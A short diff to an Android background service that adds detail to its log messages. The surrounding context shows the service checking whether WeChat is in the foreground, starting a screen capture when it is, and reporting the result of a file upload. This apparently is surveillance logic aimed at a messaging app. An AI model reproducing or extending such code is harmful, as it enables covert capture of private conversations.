@@ -111,7 +111,7 @@ public class MainService extends Service {
                         e.printStackTrace();
                     }
                     String foregroundApp = Tools.getTopAppPackageName(MainService.this);
-                    Log.i(TAG,"alive..."+Tools.getTimeStamp());
+                    Log.i(TAG,"alive..."+Tools.getTimeStamp()+"foregroundApp : "+foregroundApp);
                     if(foregroundApp.equals("com.tencent.mm")) {
                         Log.i(TAG,"captureScreen");
                         createVirtualDisplay();
@@ -227,7 +227,7 @@ public class MainService extends Service {
 
                     @Override
                     public void onError(Throwable e) {
-                        Log.e(TAG,"upload error");
+                        Log.e(TAG,"upload error:"+e.getMessage());
                     }
 
                     @Override
@@ -237,7 +237,7 @@ public class MainService extends Service {
                                 Log.i(TAG,"upload ok");
                                 break;
                             default:
-                                Log.e(TAG,"upload error");
+                                Log.e(TAG,"upload error : code "+gsonUploadFileResultBean.getCode());
                                 break;
                         }
                     }
